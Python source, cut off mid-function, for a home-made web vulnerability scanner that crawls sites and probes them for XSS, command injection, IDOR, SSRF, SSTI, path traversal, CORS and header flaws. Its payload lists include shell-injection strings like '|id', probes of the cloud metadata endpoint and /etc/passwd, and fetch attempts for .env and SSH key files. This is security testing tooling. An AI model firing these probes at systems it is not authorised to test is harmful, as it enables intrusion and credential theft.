"""Apex CLI v5.0 — Built-in scanners (no external tool dependencies)."""

import re
import socket
import subprocess
import time
import urllib.parse
from collections import defaultdict

import requests
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings()
_TIMEOUT = 10       # default request timeout
_TIMEOUT_SHORT = 5  # quick probes
_TIMEOUT_LONG = 15  # external APIs (Wayback, crt.sh)
_RATE_DELAY = 0.0  # seconds between requests per thread, set via set_rate_limit()

import threading as _tl_threading
_thread_local = _tl_threading.local()

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
]

def _get_session():
    """Return a thread-local requests session with rotating User-Agent."""
    if not hasattr(_thread_local, "session"):
        import random
        s = requests.Session()
        s.headers.update({
            "User-Agent": random.choice(_USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        })
        s.verify = False
        if _PROXY:
            s.proxies = _PROXY
        _thread_local.session = s
    return _thread_local.session

# Backwards-compat proxy — reads from thread-local session
class _SessionProxy:
    def get(self, *a, **kw):
        if _RATE_DELAY > 0:
            time.sleep(_RATE_DELAY)
        return _get_session().get(*a, **kw)
    def post(self, *a, **kw):
        if _RATE_DELAY > 0:
            time.sleep(_RATE_DELAY)
        return _get_session().post(*a, **kw)
    def request(self, *a, **kw):
        if _RATE_DELAY > 0:
            time.sleep(_RATE_DELAY)
        return _get_session().request(*a, **kw)
    def options(self, *a, **kw):
        return _get_session().options(*a, **kw)
    def head(self, *a, **kw):
        return _get_session().head(*a, **kw)
    def put(self, *a, **kw):
        if _RATE_DELAY > 0: time.sleep(_RATE_DELAY)
        return _get_session().put(*a, **kw)
    def delete(self, *a, **kw):
        if _RATE_DELAY > 0: time.sleep(_RATE_DELAY)
        return _get_session().delete(*a, **kw)
    def patch(self, *a, **kw):
        if _RATE_DELAY > 0: time.sleep(_RATE_DELAY)
        return _get_session().patch(*a, **kw)

_S = _SessionProxy()
_PROXY = None  # Set via set_proxy()

def set_proxy(proxy_url):
    """Route all requests through a proxy (e.g., Burp Suite: http://127.0.0.1:8080)."""
    global _PROXY
    _PROXY = {"http": proxy_url, "https": proxy_url}
    # Apply to all future thread-local sessions
    import threading as _pt
    _thread_local.__dict__.clear()  # Force new sessions with proxy

def set_rate_limit(delay_seconds):
    global _RATE_DELAY
    _RATE_DELAY = delay_seconds

# ---------------------------------------------------------------------------
# Crawler
# ---------------------------------------------------------------------------

def crawl(base_url, max_pages=50):
    """Crawl a site, return dict with pages, forms, links, params."""
    visited = set()
    to_visit = [base_url]
    pages = []
    forms = []
    params_found = defaultdict(set)  # url -> set of param names
    links = set()

    while to_visit and len(visited) < max_pages:
        url = to_visit.pop(0)
        norm = url.split("?")[0].split("#")[0]
        if norm in visited:
            continue
        visited.add(norm)

        try:
            r = _S.get(url, timeout=_TIMEOUT, allow_redirects=True)
        except Exception:
            continue

        pages.append({"url": url, "status": r.status_code, "length": len(r.content)})

        # Handle JSON API responses — extract keys as params
        ctype = r.headers.get("content-type", "").lower()
        if "application/json" in ctype or (r.text.strip()[:1] in ("{", "[")):
            try:
                import json as _cj
                data = _cj.loads(r.text)
                # Flatten top-level keys as params for this endpoint
                if isinstance(data, dict):
                    for k in data.keys():
                        params_found[url.split("?")[0]].add(k)
                elif isinstance(data, list) and data and isinstance(data[0], dict):
                    for k in data[0].keys():
                        params_found[url.split("?")[0]].add(k)
                # Also add any nested URL-like values as links
                def _extract_urls(obj, depth=0):
                    if depth > 3: return
                    if isinstance(obj, str) and obj.startswith(("http://","https://","/")):
                        links.add(obj if obj.startswith("http") else urllib.parse.urljoin(url, obj))
                    elif isinstance(obj, dict):
                        for v in obj.values(): _extract_urls(v, depth+1)
                    elif isinstance(obj, list):
                        for v in obj[:5]: _extract_urls(v, depth+1)
                _extract_urls(data)
            except Exception:
                pass
            continue  # No HTML to parse

        soup = BeautifulSoup(r.text, "lxml")

        # Extract links
        for tag in soup.find_all("a", href=True):
            href = tag["href"]
            full = urllib.parse.urljoin(url, href)
            parsed = urllib.parse.urlparse(full)
            # Stay on same host
            base_parsed = urllib.parse.urlparse(base_url)
            if parsed.netloc and parsed.netloc != base_parsed.netloc:
                continue
            clean = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            if parsed.query:
                for k, _ in urllib.parse.parse_qsl(parsed.query):
                    params_found[clean].add(k)
            links.add(full)
            if clean not in visited:
                to_visit.append(full)

        # Extract params from JS fetch/axios/XHR calls
        for script in soup.find_all("script", src=False):
            if not script.string:
                continue
            js = script.string
            for m in re.finditer(r"""(?:fetch|axios\.\w+|\.get|\.post)\s*\(\s*['"]([^'"]+)['"]""", js):
                ep = m.group(1)
                if "?" not in ep:
                    continue
                ep_base = ep if ep.startswith("http") else urllib.parse.urljoin(url, ep)
                for k in urllib.parse.parse_qs(urllib.parse.urlparse(ep).query):
                    params_found[ep_base.split("?")[0]].add(k)
            for m in re.finditer(r"""url\s*:\s*['"]([^'"?]+\?[^'"]+)['"]""", js):
                ep = m.group(1)
                ep_base = ep if ep.startswith("http") else urllib.parse.urljoin(url, ep)
                for k in urllib.parse.parse_qs(urllib.parse.urlparse(ep).query):
                    params_found[ep_base.split("?")[0]].add(k)

        # Extract params from data-* attributes and inline handlers
        for tag in soup.find_all(True):
            for attr, val in tag.attrs.items():
                if isinstance(val, str) and "?" in val:
                    try:
                        ep = val if val.startswith("http") else urllib.parse.urljoin(url, val)
                        ep_parsed = urllib.parse.urlparse(ep)
                        for k in urllib.parse.parse_qs(ep_parsed.query):
                            params_found[ep.split("?")[0]].add(k)
                    except Exception:
                        pass
            # Inline event handlers with URLs
            for attr in ("onclick", "onsubmit", "onchange", "data-url", "data-href", "data-action"):
                val = tag.get(attr, "")
                if val and "?" in val:
                    try:
                        for m in re.finditer(r"""['"]([^'"]+\?[^'"]+)['"]""", val):
                            ep = m.group(1)
                            ep_base = ep if ep.startswith("http") else urllib.parse.urljoin(url, ep)
                            for k in urllib.parse.parse_qs(urllib.parse.urlparse(ep).query):
                                params_found[ep_base.split("?")[0]].add(k)
                    except Exception:
                        pass

        # Extract forms
        for form in soup.find_all("form"):
            action = form.get("action", "")
            method = form.get("method", "get").upper()
            action_url = urllib.parse.urljoin(url, action)
            inputs = []
            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.get("name")
                if name:
                    inputs.append({
                        "name": name,
                        "type": inp.get("type", "text"),
                        "value": inp.get("value", ""),
                    })
            forms.append({"url": url, "action": action_url, "method": method, "inputs": inputs})

    return {
        "pages": pages,
        "forms": forms,
        "params": {u: list(p) for u, p in params_found.items()},
        "links": list(links),
    }

# ---------------------------------------------------------------------------
# XSS Scanner
# ---------------------------------------------------------------------------

_XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
    '<svg/onload=alert(1)>',
    '{{7*7}}',
]
_XSS_CANARY = "apex" + str(int(time.time()))[-6:]

def scan_xss(crawl_data):
    """Test reflected XSS on GET params and form inputs."""
    findings = []

    # GET params
    for url, params in crawl_data["params"].items():
        for param in params:
            for payload in _XSS_PAYLOADS:
                test_url = f"{url}?{urllib.parse.urlencode({param: payload})}"
                try:
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    ctype = r.headers.get("content-type", "").lower()
                    if payload in r.text and "text/html" in ctype:
                        findings.append({
                            "type": "Reflected XSS",
                            "severity": "high",
                            "url": test_url,
                            "detail": f"Param '{param}' reflects payload unescaped",
                            "template": "apex-xss",
                        })
                        break  # one payload enough per param
                except Exception:
                    continue

    # Forms (GET and POST)
    for form in crawl_data["forms"]:
        for inp in form["inputs"]:
            if inp["type"] in ("submit", "hidden", "button"):
                continue
            for payload in _XSS_PAYLOADS:
                data = {i["name"]: i["value"] or "test" for i in form["inputs"]}
                data[inp["name"]] = payload
                try:
                    if form["method"] == "GET":
                        r = _S.get(form["action"], params=data, timeout=_TIMEOUT)
                    else:
                        r = _S.post(form["action"], data=data, timeout=_TIMEOUT)
                    if payload in r.text:
                        findings.append({
                            "type": "Reflected XSS",
                            "severity": "high",
                            "url": form["action"],
                            "detail": f"Form input '{inp['name']}' reflects payload",
                            "template": "apex-xss-form",
                        })
                        break
                except Exception:
                    continue

    return findings

# ---------------------------------------------------------------------------
# Command Injection Scanner
# ---------------------------------------------------------------------------

_CMDI_PAYLOADS = [
    (";sleep 5", 4.5),
    ("|sleep 5", 4.5),
    ("$(sleep 5)", 4.5),
    ("`sleep 5`", 4.5),
]
_CMDI_BLIND_PAYLOADS = [
    (";echo apex_cmdi_test", "apex_cmdi_test"),
    ("|id", "uid="),
    ("$(whoami)", None),  # time-based only
]

def scan_cmdi(crawl_data):
    """Test command injection on form inputs using time-based and output-based detection."""
    findings = []

    for form in crawl_data["forms"]:
        if form["method"] != "POST":
            continue
        for inp in form["inputs"]:
            if inp["type"] in ("submit", "hidden", "button", "password"):
                continue

            # Time-based detection
            for payload, min_delay in _CMDI_PAYLOADS:
                data = {i["name"]: i["value"] or "127.0.0.1" for i in form["inputs"]}
                data[inp["name"]] = "127.0.0.1" + payload
                try:
                    start = time.time()
                    r = _S.post(form["action"], data=data, timeout=15)
                    elapsed = time.time() - start
                    if elapsed >= min_delay:
                        findings.append({
                            "type": "Command Injection (time-based)",
                            "severity": "critical",
                            "url": form["action"],
                            "detail": f"Input '{inp['name']}' — {elapsed:.1f}s delay with '{payload}'",
                            "template": "apex-cmdi",
                        })
                        break
                except Exception:
                    continue

            # Output-based detection
            for payload, marker in _CMDI_BLIND_PAYLOADS:
                if marker is None:
                    continue
                data = {i["name"]: i["value"] or "127.0.0.1" for i in form["inputs"]}
                data[inp["name"]] = "127.0.0.1" + payload
                try:
                    r = _S.post(form["action"], data=data, timeout=_TIMEOUT)
                    if marker in r.text:
                        findings.append({
                            "type": "Command Injection (output-based)",
                            "severity": "critical",
                            "url": form["action"],
                            "detail": f"Input '{inp['name']}' — found '{marker}' in response",
                            "template": "apex-cmdi",
                        })
                        break
                except Exception:
                    continue

    return findings

# ---------------------------------------------------------------------------
# IDOR Scanner
# ---------------------------------------------------------------------------

def scan_idor(crawl_data):
    """Test IDOR by enumerating numeric IDs on endpoints with id-like params."""
    findings = []
    id_params = ("id", "uid", "user_id", "userid", "account", "doc", "file", "note", "item", "order")

    # Check params found by crawler
    for url, params in crawl_data["params"].items():
        for param in params:
            if param.lower() not in id_params:
                continue
            findings.extend(_test_idor(url, param))

    # Also probe discovered pages with common id params
    tested = set()
    for page in crawl_data["pages"]:
        base = page["url"].split("?")[0]
        if base in tested:
            continue
        tested.add(base)
        for param in ("id", "uid", "user_id"):
            # Quick check: does the endpoint accept this param?
            try:
                r = _S.get(f"{base}?{param}=1", timeout=_TIMEOUT)
                if r.status_code == 200 and len(r.text) > 20:
                    findings.extend(_test_idor(base, param))
            except Exception:
                continue

    # Deduplicate
    seen = set()
    unique = []
    for f in findings:
        key = f"{f['url']}|{f['detail']}"
        if key not in seen:
            seen.add(key)
            unique.append(f)
    return unique


def _test_idor(url, param):
    """Test a single URL+param for IDOR by enumerating IDs 1-5."""
    findings = []
    responses = {}
    for test_id in range(1, 6):
        try:
            r = _S.get(f"{url}?{urllib.parse.urlencode({param: test_id})}", timeout=_TIMEOUT)
            if r.status_code == 200 and len(r.text) > 20:
                responses[test_id] = r.text[:200]
        except Exception:
            continue
    unique = set(responses.values())
    if len(unique) > 1:
        findings.append({
            "type": "IDOR (Insecure Direct Object Reference)",
            "severity": "high",
            "url": f"{url}?{param}=<id>",
            "detail": f"Param '{param}' returns different data for IDs {list(responses.keys())} without auth",
            "template": "apex-idor",
        })
    return findings

# ---------------------------------------------------------------------------
# Open Redirect Scanner
# ---------------------------------------------------------------------------

_REDIRECT_PARAMS = ("url", "redirect", "next", "return", "returnto", "goto", "dest",
                     "destination", "redir", "redirect_uri", "continue", "target", "link")
_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com%00",
]

def _is_open_redirect(location, payload):
    """Return True only if Location actually redirects to the payload domain."""
    if not location:
        return False
    parsed = urllib.parse.urlparse(location)
    return parsed.netloc in ("evil.com", "www.evil.com") or location.startswith("//evil.com")


def scan_open_redirect(crawl_data):
    """Test open redirect on URL-like parameters."""
    findings = []

    # Check params found by crawler
    for url, params in crawl_data["params"].items():
        for param in params:
            if param.lower() not in _REDIRECT_PARAMS:
                continue
            findings.extend(_test_redirect(url, param))

    # Probe discovered pages with common redirect params
    tested = set()
    for page in crawl_data["pages"]:
        base = page["url"].split("?")[0]
        if base in tested:
            continue
        tested.add(base)
        for param in ("url", "redirect", "next", "goto"):
            try:
                r = _S.get(f"{base}?{param}=https://evil.com",
                           timeout=_TIMEOUT, allow_redirects=False)
                loc = r.headers.get("Location", "")
                if _is_open_redirect(loc, "https://evil.com"):
                    findings.append({
                        "type": "Open Redirect",
                        "severity": "medium",
                        "url": f"{base}?{param}=https://evil.com",
                        "detail": f"Redirects to: {loc}",
                        "template": "apex-redirect",
                    })
                    break
            except Exception:
                continue

    # Check forms too
    for form in crawl_data["forms"]:
        for inp in form["inputs"]:
            if inp["name"].lower() not in _REDIRECT_PARAMS:
                continue
            findings.extend(_test_redirect_form(form, inp))

    # Deduplicate
    seen = set()
    unique = []
    for f in findings:
        key = f["url"]
        if key not in seen:
            seen.add(key)
            unique.append(f)
    return unique


def _test_redirect(url, param):
    findings = []
    for payload in _REDIRECT_PAYLOADS:
        try:
            r = _S.get(f"{url}?{urllib.parse.urlencode({param: payload})}",
                       timeout=_TIMEOUT, allow_redirects=False)
            loc = r.headers.get("Location", "")
            if _is_open_redirect(loc, payload):
                findings.append({
                    "type": "Open Redirect",
                    "severity": "medium",
                    "url": f"{url}?{param}={payload}",
                    "detail": f"Redirects to: {loc}",
                    "template": "apex-redirect",
                })
                break
        except Exception:
            continue
    return findings


def _test_redirect_form(form, inp):
    findings = []
    for payload in _REDIRECT_PAYLOADS:
        data = {i["name"]: i["value"] or "/" for i in form["inputs"]}
        data[inp["name"]] = payload
        try:
            if form["method"] == "GET":
                r = _S.get(form["action"], params=data, timeout=_TIMEOUT, allow_redirects=False)
            else:
                r = _S.post(form["action"], data=data, timeout=_TIMEOUT, allow_redirects=False)
            loc = r.headers.get("Location", "")
            if _is_open_redirect(loc, payload):
                findings.append({
                    "type": "Open Redirect",
                    "severity": "medium",
                    "url": form["action"],
                    "detail": f"Input '{inp['name']}' redirects to: {loc}",
                    "template": "apex-redirect",
                })
                break
        except Exception:
            continue
    return findings

# ---------------------------------------------------------------------------
# Security Headers Analyzer
# ---------------------------------------------------------------------------

_SECURITY_HEADERS = {
    "Strict-Transport-Security": ("HSTS missing — no HTTPS enforcement", "medium"),
    "Content-Security-Policy": ("CSP missing — XSS risk", "medium"),
    "X-Frame-Options": ("X-Frame-Options missing — clickjacking risk", "low"),
    "X-Content-Type-Options": ("X-Content-Type-Options missing — MIME sniffing risk", "low"),
    "X-XSS-Protection": ("X-XSS-Protection missing", "info"),
    "Referrer-Policy": ("Referrer-Policy missing — info leakage risk", "low"),
    "Permissions-Policy": ("Permissions-Policy missing", "info"),
}

def scan_headers(base_url):
    """Check for missing security headers."""
    findings = []
    try:
        r = _S.get(base_url, timeout=_TIMEOUT)
    except Exception:
        return findings

    for header, (msg, severity) in _SECURITY_HEADERS.items():
        if header.lower() not in {k.lower(): v for k, v in r.headers.items()}:
            findings.append({
                "type": f"Missing Header: {header}",
                "severity": severity,
                "url": base_url,
                "detail": msg,
                "template": "apex-headers",
            })

    # Check for info-leaking headers
    for bad_header in ("Server", "X-Powered-By", "X-AspNet-Version"):
        val = r.headers.get(bad_header)
        if val:
            findings.append({
                "type": f"Info Disclosure: {bad_header}",
                "severity": "info",
                "url": base_url,
                "detail": f"{bad_header}: {val}",
                "template": "apex-headers",
            })

    return findings

# ---------------------------------------------------------------------------
# Tech Fingerprinting
# ---------------------------------------------------------------------------

_TECH_SIGNATURES = [
    ("Flask", [r"Werkzeug", r"flask", r"Set-Cookie:.*session="]),
    ("Django", [r"csrfmiddlewaretoken", r"django", r"__admin"]),
    ("Express", [r"X-Powered-By:\s*Express", r"express"]),
    ("PHP", [r"X-Powered-By:\s*PHP", r"\.php", r"PHPSESSID"]),
    ("ASP.NET", [r"X-AspNet-Version", r"__VIEWSTATE", r"\.aspx"]),
    ("WordPress", [r"wp-content", r"wp-includes", r"wordpress"]),
    ("Joomla", [r"joomla", r"/administrator"]),
    ("Drupal", [r"drupal", r"sites/default"]),
    ("Nginx", [r"Server:\s*nginx"]),
    ("Apache", [r"Server:\s*Apache"]),
    ("Cloudflare", [r"Server:\s*cloudflare", r"cf-ray"]),
    ("React", [r"react", r"_reactRoot", r"__NEXT_DATA__"]),
    ("Vue", [r"vue", r"v-app", r"nuxt"]),
    ("Bootstrap", [r"bootstrap\.min\.(css|js)"]),
    ("jQuery", [r"jquery\.min\.js", r"jquery"]),
]

def fingerprint(base_url):
    """Detect technologies from headers and response body."""
    detected = []
    try:
        r = _S.get(base_url, timeout=_TIMEOUT)
    except Exception:
        return detected

    headers_str = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
    combined = headers_str + "\n" + r.text[:50000]

    for tech, patterns in _TECH_SIGNATURES:
        for pat in patterns:
            if re.search(pat, combined, re.IGNORECASE):
                detected.append(tech)
                break

    return list(set(detected))

# ---------------------------------------------------------------------------
# WAF Detection
# ---------------------------------------------------------------------------

_WAF_SIGNATURES = {
    "Cloudflare": [r"cf-ray", r"Server:\s*cloudflare", r"__cfduid"],
    "AWS WAF": [r"awselb", r"x-amzn-requestid"],
    "Akamai": [r"akamai", r"x-akamai"],
    "Sucuri": [r"sucuri", r"x-sucuri"],
    "Imperva": [r"incapsula", r"x-iinfo", r"visid_incap"],
    "ModSecurity": [r"mod_security", r"modsecurity"],
    "Wordfence": [r"wordfence"],
    "F5 BIG-IP": [r"BigIP", r"F5"],
    "Barracuda": [r"barracuda", r"barra_counter"],
    "Fortinet": [r"fortigate", r"fortiWeb"],
}

def detect_waf(base_url):
    """Detect WAF by checking headers and sending a malicious-looking request."""
    detected = []

    # Normal request
    try:
        r = _S.get(base_url, timeout=_TIMEOUT)
        headers_str = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        cookies_str = str(r.cookies.get_dict())
        combined = headers_str + cookies_str
    except Exception:
        return detected

    for waf, patterns in _WAF_SIGNATURES.items():
        for pat in patterns:
            if re.search(pat, combined, re.IGNORECASE):
                detected.append(waf)
                break

    # Trigger WAF with malicious payload
    try:
        r2 = _S.get(f"{base_url}/?id=1' OR 1=1--", timeout=_TIMEOUT)
        if r2.status_code in (403, 406, 429, 503):
            if not detected:
                detected.append("Unknown WAF (blocked SQLi probe)")
    except Exception:
        pass

    return list(set(detected))

# ---------------------------------------------------------------------------
# Sensitive File Scanner
# ---------------------------------------------------------------------------

_SENSITIVE_PATHS = [
    ("/.env", "Environment file with credentials"),
    ("/.git/HEAD", "Git repository exposed"),
    ("/.git/config", "Git config exposed"),
    ("/.svn/entries", "SVN repository exposed"),
    ("/.DS_Store", "macOS directory metadata"),
    ("/robots.txt", "Robots file (may reveal hidden paths)"),
    ("/sitemap.xml", "Sitemap"),
    ("/.htaccess", "Apache config"),
    ("/web.config", "IIS config"),
    ("/wp-config.php.bak", "WordPress config backup"),
    ("/config.php.bak", "Config backup"),
    ("/debug", "Debug endpoint"),
    ("/server-status", "Apache server status"),
    ("/server-info", "Apache server info"),
    ("/phpinfo.php", "PHP info page"),
    ("/info.php", "PHP info page"),
    ("/elmah.axd", "ASP.NET error log"),
    ("/trace.axd", "ASP.NET trace"),
    ("/backup.sql", "Database backup"),
    ("/dump.sql", "Database dump"),
    ("/database.sql", "Database export"),
    ("/db.sql", "Database file"),
    ("/.bash_history", "Bash history"),
    ("/.ssh/id_rsa", "SSH private key"),
    ("/id_rsa", "SSH private key"),
    ("/admin", "Admin panel"),
    ("/administrator", "Admin panel"),
    ("/console", "Debug console"),
    ("/swagger.json", "API documentation"),
    ("/api-docs", "API documentation"),
    ("/graphql", "GraphQL endpoint"),
    ("/actuator", "Spring Boot actuator"),
    ("/actuator/env", "Spring Boot env"),
    ("/actuator/health", "Spring Boot health"),
    ("/.well-known/security.txt", "Security contact"),
    ("/crossdomain.xml", "Flash cross-domain policy"),
    ("/clientaccesspolicy.xml", "Silverlight policy"),
]

def scan_sensitive_files(base_url):
    """Check for common sensitive files — concurrent requests."""
    import concurrent.futures as _cf
    findings = []

    def _check_path(path_desc):
        path, desc = path_desc
        url = base_url.rstrip("/") + path
        try:
            r = _S.get(url, timeout=5, allow_redirects=False)
            if r.status_code == 200 and len(r.text) > 0:
                if any(x in r.text.lower() for x in ("not found", "404", "error")):
                    return None
                severity = "high"
                if path in ("/robots.txt", "/sitemap.xml", "/.well-known/security.txt"):
                    severity = "info"
                elif path in ("/admin", "/administrator", "/console"):
                    severity = "medium"
                return {
                    "type": f"Sensitive File: {path}",
                    "severity": severity,
                    "url": url,
                    "detail": f"{desc} ({len(r.text)} bytes)",
                    "template": "apex-sensitive",
                }
        except Exception:
            pass
        return None

    with _cf.ThreadPoolExecutor(max_workers=20) as pool:
        for result in pool.map(_check_path, _SENSITIVE_PATHS):
            if result:
                findings.append(result)
    return findings


# ---------------------------------------------------------------------------
# Advanced scanners — find real bugs that pay bounties
# ---------------------------------------------------------------------------

def scan_ssrf(crawl_data):
    """Test for Server-Side Request Forgery."""
    findings = []
    canary = "http://169.254.169.254/latest/meta-data/"
    canary2 = "http://127.0.0.1:22"
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload in [canary, canary2, "http://[::1]", "file:///etc/passwd"]:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT, allow_redirects=False)
                    if any(x in r.text.lower() for x in ["ami-id", "instance-id", "ssh-", "root:", "meta-data"]):
                        findings.append({"type": "SSRF", "severity": "critical", "url": test_url,
                                         "detail": f"SSRF via param {p}", "template": "apex-ssrf"})
                        break
                except Exception:
                    continue
    return findings


def scan_ssti(crawl_data):
    """Test for Server-Side Template Injection."""
    findings = []
    payloads = [("{{7*7}}", "49"), ("${7*7}", "49"), ("<%= 7*7 %>", "49"), ("#{7*7}", "49"), ("{{config}}", "SECRET_KEY")]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload, expect in payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if expect in r.text and payload not in r.text:
                        findings.append({"type": "SSTI (Server-Side Template Injection)", "severity": "critical",
                                         "url": test_url, "detail": f"SSTI via {p}: {payload} → {expect}",
                                         "template": "apex-ssti"})
                        break
                except Exception:
                    continue
    return findings


def scan_path_traversal(crawl_data):
    """Test for path traversal / LFI."""
    findings = []
    payloads = ["....//....//....//....//etc/passwd", "..%2f..%2f..%2f..%2fetc/passwd",
                "....//....//....//....//windows/win.ini", "/etc/passwd", "..\\..\\..\\..\\windows\\win.ini"]
    markers = ["root:x:", "root:*:", "[fonts]", "daemon:"]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload in payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if any(m in r.text for m in markers):
                        findings.append({"type": "Path Traversal / LFI", "severity": "critical",
                                         "url": test_url, "detail": f"LFI via {p}", "template": "apex-lfi"})
                        break
                except Exception:
                    continue
    return findings


def scan_broken_auth(crawl_data):
    """Test for broken authentication — accessible admin/API endpoints."""
    findings = []
    admin_paths = ["/admin", "/admin/dashboard", "/api/admin", "/api/users", "/api/v1/users",
                   "/graphql", "/api/config", "/debug", "/actuator", "/actuator/env",
                   "/swagger-ui.html", "/api-docs", "/.well-known/openid-configuration",
                   "/wp-json/wp/v2/users", "/api/v1/admin", "/internal", "/management"]
    for target in crawl_data.get("pages", [])[:3]:
        base = target["url"].split("/", 3)
        if len(base) >= 3:
            base_url = "/".join(base[:3])
        else:
            continue
        # Get baseline 404
        try:
            r404 = _S.get(f"{base_url}/nonexistent_test_8374xyz", timeout=5)
            size_404 = len(r404.content)
        except Exception:
            continue
        for path in admin_paths:
            try:
                r = _S.get(f"{base_url}{path}", timeout=5, allow_redirects=False)
                if r.status_code == 200 and abs(len(r.content) - size_404) > 100:
                    body = r.text[:500].lower()
                    # Check for real content indicators
                    if any(x in body for x in ["admin", "dashboard", "user", "config", "swagger",
                                                "graphql", "query", "schema", "endpoint", "api",
                                                "token", "secret", "password", "email"]):
                        findings.append({"type": f"Exposed Endpoint: {path}", "severity": "high",
                                         "url": f"{base_url}{path}",
                                         "detail": f"Accessible without auth ({r.status_code}, {len(r.content)}b)",
                                         "template": "apex-auth"})
            except Exception:
                continue
    return findings


def scan_cors(crawl_data):
    """Test for CORS misconfiguration."""
    findings = []
    tested = set()
    for target in crawl_data.get("pages", [])[:10]:
        url = target["url"]
        base = "/".join(url.split("/", 3)[:3])
        if base in tested:
            continue
        tested.add(base)
        for origin in ["https://evil.com", "null", f"{base}.evil.com"]:
            try:
                r = _S.get(url, timeout=5, headers={"Origin": origin})
                acao = r.headers.get("Access-Control-Allow-Origin", "")
                acac = r.headers.get("Access-Control-Allow-Credentials", "")
                if acao == origin and acac.lower() == "true":
                    findings.append({"type": "CORS Misconfiguration", "severity": "high",
                                     "url": url, "detail": f"Reflects origin {origin} with credentials",
                                     "template": "apex-cors"})
                    break
            except Exception:
                continue
    return findings


# ---------------------------------------------------------------------------
# More advanced scanners — high-value bug classes
# ---------------------------------------------------------------------------

def scan_prototype_pollution(crawl_data):
    """Test for prototype pollution via query params."""
    findings = []
    for target in crawl_data.get("pages", [])[:5]:
        url = target["url"].split("?")[0]
        try:
            payload_url = f"{url}?__proto__[test]=polluted&constructor[prototype][test]=polluted"
            r = _S.get(payload_url, timeout=_TIMEOUT)
            if "polluted" in r.text and "__proto__" not in r.text:
                findings.append({"type": "Prototype Pollution", "severity": "high", "url": payload_url,
                                 "detail": "Reflected prototype pollution", "template": "apex-pp"})
        except: pass
    return findings


def scan_host_header_injection(crawl_data):
    """Test for host header injection."""
    findings = []
    tested = set()
    for target in crawl_data.get("pages", [])[:5]:
        base = "/".join(target["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r = _S.get(target["url"], timeout=_TIMEOUT, headers={"Host": "evil.com"}, allow_redirects=False)
            if "evil.com" in r.text or "evil.com" in r.headers.get("Location", ""):
                findings.append({"type": "Host Header Injection", "severity": "high", "url": target["url"],
                                 "detail": "Host header reflected/used in redirect", "template": "apex-hhi"})
        except: pass
        try:
            r = _S.get(target["url"], timeout=_TIMEOUT, headers={"X-Forwarded-Host": "evil.com"}, allow_redirects=False)
            if "evil.com" in r.text or "evil.com" in r.headers.get("Location", ""):
                findings.append({"type": "Host Header Injection (X-Forwarded-Host)", "severity": "high",
                                 "url": target["url"], "detail": "X-Forwarded-Host reflected", "template": "apex-hhi"})
        except: pass
    return findings


def scan_crlf_injection(crawl_data):
    """Test for CRLF injection in headers."""
    findings = []
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = ["test%0d%0aX-Injected: true"]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                r = _S.get(test_url, timeout=_TIMEOUT, allow_redirects=False)
                if "X-Injected" in str(r.headers):
                    findings.append({"type": "CRLF Injection", "severity": "high", "url": test_url,
                                     "detail": f"Header injection via {p}", "template": "apex-crlf"})
                    break
            except: continue
    return findings


def scan_jwt_issues(crawl_data):
    """Check for JWT misconfigurations."""
    findings = []
    tested = set()
    for target in crawl_data.get("pages", [])[:5]:
        base = "/".join(target["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        # Check common JWT endpoints
        for path in ["/api/auth", "/api/login", "/auth/token", "/oauth/token", "/api/v1/auth"]:
            try:
                r = _S.post(f"{base}{path}", json={"username":"test","password":"test"}, timeout=5)
                body = r.text
                # Check if response contains a JWT
                import re as _re
                jwts = _re.findall(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', body)
                if jwts:
                    # Try none algorithm
                    import base64
                    for jwt in jwts:
                        parts = jwt.split(".")
                        try:
                            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
                            if header.get("alg") == "none" or header.get("alg") == "HS256":
                                findings.append({"type": "JWT Weak Algorithm", "severity": "high",
                                                 "url": f"{base}{path}", "detail": f"JWT uses {header.get('alg')}",
